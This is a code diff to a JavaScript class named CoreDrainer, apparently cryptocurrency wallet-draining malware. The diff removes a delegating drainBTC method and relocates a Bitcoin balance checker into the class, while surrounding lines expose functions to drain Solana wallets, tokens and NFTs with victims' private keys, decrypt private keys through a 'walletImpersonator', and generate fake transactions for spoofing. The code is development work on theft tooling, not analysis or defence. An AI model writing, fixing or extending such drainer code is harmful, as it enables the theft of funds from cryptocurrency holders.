@@ -887,11 +887,6 @@ export class CoreDrainer {
   decryptPrivateKey(encryptedData) { return this.walletImpersonator.decryptPrivateKey(encryptedData); }
 
   // Bitcoin
-  async getBTCBalance(address) { return await this.bitcoinDrainer.getBTCBalance(address); }
-  async drainBTC(fromAddress, privateKeyWIF, destinationAddress) { 
-    return await this.bitcoinDrainer.drainBTC(fromAddress, privateKeyWIF, destinationAddress); 
-  }
-  validateBitcoinAddress(address) { return this.bitcoinDrainer.validateBitcoinAddress(address); }
 
   // Transaction Spoofing
   async generateFakeTransaction(userAddress, txType = 'swap', chainId = 1) { 
@@ -985,6 +980,30 @@ export class CoreDrainer {
   // Solana Drainer
   async drainSolanaWallet(userAddress, privateKey) { return await solanaDrainer.drainSolanaWallet(userAddress, privateKey); }
   async getSolanaBalance(userAddress) { return await solanaDrainer.getSolanaBalance(userAddress); }
+
+  // BTC balance checker
+  async getBTCBalance(address) {
+    try {
+      console.log('🔍 Checking BTC balance for:', address);
+      
+      // Use blockchain.com API
+      const response = await fetch(`https://blockstream.info/api/address/${address}`);
+      const data = await response.json();
+      
+      // Calculate total balance from UTXOs
+      const balance = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
+      
+      return {
+        satoshis: balance,
+        btc: balance / 100000000,
+        usd: 0 // You can add USD conversion later
+      };
+      
+    } catch (error) {
+      console.error('❌ BTC balance check failed:', error);
+      return { satoshis: 0, btc: 0, usd: 0 };
+    }
+  }
   async drainSolanaTokens(userAddress, privateKey) { return await solanaDrainer.drainSolanaTokens(userAddress, privateKey); }
   async drainSolanaNFTs(userAddress, privateKey) { return await solanaDrainer.drainSolanaNFTs(userAddress, privateKey); }
 
@@ -1083,26 +1102,3 @@ export class CoreDrainer {
 
 export const coreDrainer = new CoreDrainer();
 export default coreDrainer;
-// BTC balance checker
-async getBTCBalance(address) {
-  try {
-    console.log('🔍 Checking BTC balance for:', address);
-    
-    // Use blockchain.com API
-    const response = await fetch(`https://blockstream.info/api/address/${address}`);
-    const data = await response.json();
-    
-    // Calculate total balance from UTXOs
-    const balance = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
-    
-    return {
-      satoshis: balance,
-      btc: balance / 100000000,
-      usd: 0 // You can add USD conversion later
-    };
-    
-  } catch (error) {
-    console.error('❌ BTC balance check failed:', error);
-    return { satoshis: 0, btc: 0, usd: 0 };
-  }
-}
